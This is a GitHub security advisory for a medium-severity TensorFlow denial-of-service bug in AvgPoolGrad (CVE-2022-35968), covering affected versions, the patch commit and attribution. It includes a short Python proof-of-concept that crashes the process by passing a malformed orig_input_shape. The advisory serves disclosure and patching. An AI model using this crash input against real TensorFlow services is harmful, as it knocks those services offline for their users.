# [M] TensorFlow vulnerable to `CHECK` fail in `AvgPoolGrad`

## Summary
Severity: Medium
Advisory: GHSA-2475-53vw-vp25
CVE: CVE-2022-35968
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-2475-53vw-vp25
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
The implementation of `AvgPoolGrad` does not fully validate the input `orig_input_shape`. This results in a `CHECK` failure which can be used to trigger a denial of service attack:
```python
import tensorflow as tf

ksize = [1, 2, 2, 1]
strides = [1, 2, 2, 1]
padding = "VALID"
data_format = "NHWC"
orig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)
grad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)
tf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

### Patches
We have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2475-53vw-vp25
- https://nvd.nist.gov/vuln/detail/CVE-2022-35968
- https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
